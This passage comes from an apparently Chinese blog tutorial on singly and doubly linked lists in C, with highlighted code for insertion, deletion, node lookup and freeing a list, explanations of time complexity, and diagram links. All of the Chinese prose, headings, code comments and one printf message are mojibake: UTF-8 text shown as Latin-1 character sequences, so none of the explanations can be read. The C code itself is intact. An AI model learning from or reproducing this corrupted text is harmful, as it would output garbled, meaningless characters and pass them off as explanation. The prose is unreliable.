L,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">backInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">DeleteNode</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    L = DeleteNode(L,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;                       <span class="comment">//å®ç°åœ¨ç¬¬iä¸ªç»“ç‚¹ä¹‹åè¿›è¡Œæ’å…¥</span></span><br><span class="line">    LinkList p,s;</span><br><span class="line">    s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p = GetElem(L,i<span class="number">-1</span>);                                         <span class="comment">//è·å–ç¬¬iä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹</span></span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">backInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p,s;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p = GetElem(L,i);                                         <span class="comment">//è·å–ç¬¬iä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹</span></span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    temp = p-&gt;data;</span><br><span class="line">    p-&gt;data = s-&gt;data;</span><br><span class="line">    s-&gt;data = temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ é™¤ç»“ç‚¹æ“ä½œçš„å‡½æ•°çš„ä¸»ä½“å¦‚ä¸‹</span></span><br><span class="line">LinkList <span class="title function_">DeleteNode</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    LinkList p,q;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    p = GetElem(L,i<span class="number">-1</span>);</span><br><span class="line">    q = p-&gt;next;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¢«åˆ é™¤ç»“ç‚¹çš„å…ƒç´ çš„æ•°æ®ä¸ºï¼š%d\n&quot;</span>,q-&gt;data);</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å’Œæ’å…¥ç®—æ³•ä¸€æ ·ï¼Œè¯¥ç®—æ³•çš„ä¸»è¦æ—¶é—´ä¹Ÿæ˜¯è€—è´¹åœ¨æŸ¥æ‰¾æ“ä½œä¸Šï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><h3 id="7-æ±‚è¡¨é•¿æ“ä½œ"><a class="markdownIt-Anchor" href="#7-æ±‚è¡¨é•¿æ“ä½œ">#</a> 7ã€æ±‚è¡¨é•¿æ“ä½œï¼š</h3><p>â€‹æ±‚è¡¨é•¿æ“ä½œè¦æ±‚è®¡ç®—å•é“¾è¡¨æ•°æ®ç»“ç‚¹ï¼Œä¹Ÿå°±æ˜¯ä¸å«å¤´ç»“ç‚¹çš„ç»“ç‚¹çš„æ€»ä¸ªæ•°ï¼Œéœ€è¦ä»ç¬¬ä¸€ä¸ªç»“ç‚¹å¼€å§‹éå†ï¼Œç›´åˆ°è®¿é—®å®Œæ‰€æœ‰çš„ç»“ç‚¹ï¼Œå› ä¸ºæ¯”è¾ƒç®€å•ï¼Œå…·ä½“å®ç°å°±ä¸è¿›è¡Œèµ˜è¿°äº†ï¼Œä¸è¿‡éœ€è¦æ³¨æ„ï¼šæœ‰çš„é“¾è¡¨å­˜åœ¨å¤´ç»“ç‚¹ï¼Œæœ‰çš„ä¸å­˜åœ¨ï¼Œåœ¨è®¡ç®—çš„æ—¶å€™è¦åšå¥½ç›¸å…³çš„åŒºåˆ†æ“ä½œã€‚</p><h3 id="8-é”€æ¯æ•´ä¸ªè¡¨æˆ‘è‡ªå·±å†™çš„"><a class="markdownIt-Anchor" href="#8-é”€æ¯æ•´ä¸ªè¡¨æˆ‘è‡ªå·±å†™çš„">#</a> 8ã€é”€æ¯æ•´ä¸ªè¡¨ï¼ˆæˆ‘è‡ªå·±å†™çš„ï¼‰</h3><p>â€‹ä¸å¤šè§£é‡Šï¼Œç›´æ¥ä¸Šæºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AllFree</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LinkList p = L-&gt;next,r;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        r = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="233-åŒé“¾è¡¨"><a class="markdownIt-Anchor" href="#233-åŒé“¾è¡¨">#</a> 2.3.3ã€åŒé“¾è¡¨ï¼š</h2><p>â€‹å•é“¾è¡¨ç»“ç‚¹ä¸­åªæœ‰ä¸€ä¸ªæŒ‡å‘å…¶åç»§çš„æŒ‡é’ˆï¼Œä½¿å¾—å•é“¾è¡¨åªèƒ½ä»å¤´ç»“ç‚¹ä¾æ¬¡é¡ºåºåœ°å‘åéå†ã€‚è¦è®¿é—®æŸä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹ï¼ˆæ’å…¥ã€åˆ é™¤æ“ä½œæ—¶ï¼‰ï¼Œåªèƒ½ä»å¤´å¼€å§‹éå†ï¼Œè®¿é—®åç»§ç»“ç‚¹çš„æ—¶é—´å¤æ‚åº¦ä¸º O (1)ï¼Œè®¿é—®å‰é©±ç»“ç‚¹çš„æ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><p>â€‹ä¸ºäº†å…‹æœå•é“¾è¡¨çš„ä¸Šè¿°ç¼ºç‚¹ï¼Œå¼•å…¥äº†åŒé“¾è¡¨ï¼ŒåŒé“¾è¡¨ç»“ç‚¹ä¸­æœ‰ä¸¤ä¸ªæŒ‡é’ˆ prior å’Œ next ï¼Œåˆ†åˆ«æŒ‡å‘å…¶å‰é©±å’Œåç»§ç»“ç‚¹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/6a070713e10d4b7db43ce36d6d0170cc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åŒé“¾è¡¨ä¸­ç»“ç‚¹ç±»å‹çš„æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125; Dnode,*DLinkList;</span><br></pre></td></tr></table></figure><p>â€‹åŒé“¾è¡¨åœ¨å•é“¾è¡¨çš„ç»“ç‚¹ä¸­å¢åŠ äº†ä¸€ä¸ªæŒ‡å‘å‰é©±çš„ prior æŒ‡é’ˆï¼Œå› æ­¤åŒé“¾è¡¨ä¸­çš„æŒ‰å€¼æŸ¥æ‰¾å’ŒæŒ‰ä½æŸ¥æ‰¾çš„æ“ä½œä¸å•é“¾è¡¨ç›¸åŒã€‚ä½†åŒé“¾è¡¨åœ¨æ’å…¥å’Œåˆ é™¤æ“ä½œçš„å®ç°ä¸Šï¼Œä¸å•é“¾è¡¨æœ‰ç€è¾ƒå¤§çš„ä¸åŒã€‚è¿™æ˜¯å› ä¸º â€œé“¾â€ å˜åŒ–æ—¶ä¹Ÿéœ€è¦å¯¹ prior æŒ‡é’ˆåšå‡ºä¿®æ”¹ï¼Œå…¶å…³é”®æ˜¯ä¿è¯åœ¨ä¿®æ”¹çš„è¿‡ç¨‹ä¸­ä¸æ–­é“¾ã€‚æ­¤å¤–ï¼ŒåŒé“¾è¡¨å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ‰¾åˆ°å…¶å‰é©±ç»“ç‚¹ï¼Œå› æ­¤ï¼Œæ’å…¥ã€åˆ é™¤æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä»…ä¸º O (1)ã€‚</p><h3 id="1-åŒé“¾è¡¨çš„æ’å…¥æ“ä½œ"><a class="markdownIt-Anchor" href="#1-åŒé“¾è¡¨çš„æ’å…¥æ“ä½œ">#</a> 1ã€åŒé“¾è¡¨çš„æ’å…¥æ“ä½œï¼š</h3><p>â€‹åœ¨åŒé“¾è¡¨ä¸­ p æ‰€æŒ‡çš„ç»“ç‚¹ä¹‹åæ’å…¥ç»“ç‚¹ *s ï¼Œå…¶æŒ‡é’ˆçš„å˜åŒ–è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/f26e46095c41400289d078ff0e1d7e45.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ’å…¥æ“ä½œçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125; DNode,*DLinkList;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">create</span><span class="params">(DLinkList DL)</span>;</span><br><span class="line">DLinkList <span class="title function_">GetElem</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>;</span><br><span class="line">DLinkList <span class="title function_">Insert</span><span class="params">(DLinkList DL,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AllFree</span><span class="params">(DLinkList L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    DLinkList DL,p;</span><br><span class="line"></span><br><span class="line">    DL = create(DL);</span><br><span class="line"></span><br><span class="line">    p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    DL = Insert(DL,<span class="number">3</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AllFree(DL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">create</span><span class="params">(DLinkList DL)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    DL = (DLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    DLinkList s,r = DL;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (DLinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r-&gt;next-&gt;prior = r;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">GetElem</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    DLinkList p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æ’å…¥æ“ä½œçš„å‡½æ•°ä¸»ä½“å¦‚ä¸‹</span></span><br><span class="line">DLinkList <span class="title function_">Insert</span><span class="params">(DLinkList DL,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    DLinkList s,p;</span><br><span class="line">    s = (DLinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    p = GetElem(DL,i<span class="number">-1</span>);</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next-&gt;prior = s;</span><br><span class="line">    s-&gt;prior = p;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AllFree</span><span class="params">(DLinkList DL)</span>&#123;</span><br><span class="line">    DLinkList p = DL-&gt;next,r;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        r = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(DL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-åŒé“¾è¡¨çš„åˆ é™¤æ“ä½œ"><a class="markdownIt-Anchor" href="#2-åŒé“¾è¡¨çš„åˆ é™¤æ“ä½œ">#</a> 2ã€åŒé“¾è¡¨çš„åˆ é™¤æ“ä½œï¼š</h3><p>â€‹åˆ é™¤åŒé“¾è¡¨çš„ç»“ç‚¹ *p çš„åç»§ç»“ç‚¹ *q ï¼ŒæŒ‡é’ˆå˜åŒ–è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/98f33a5cc0c146d7b992addfd0001ff9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åˆ é™¤æ“ä½œçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125; DNode,*DLinkList;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">create</span><span class="params">(DLinkList DL)</span>;</span><br><span class="line">DLinkList <span class="title function_">GetElem</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>;</span><br><span class="line">DLinkList <span class="title function_">Insert</span><span class="params">(DLinkList DL,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line">DLinkList <span class="title function_">Delete</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AllFree</span><span class="params">(DLinkList L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    DLinkList DL,p;</span><br><span class="line">    DL = create(DL);</span><br><span class="line"></span><br><span class="line">    p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    DL = Insert(DL,<span class="number">3</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    DL = Delete(DL,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AllFree(DL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">create</span><span class="params">(DLinkList DL)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    DL = (DLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    DLinkList s,r = DL;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (DLinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r-&gt;next-&gt;prior = r;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">GetElem</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    DLinkList p = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DLinkList <span class="title function_">Insert</span><span class="params">(DLinkList DL,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    DLinkList s,p;</span><br><span class="line">    s = (DLinkList) <span class="built_in">malloc</span>(<span 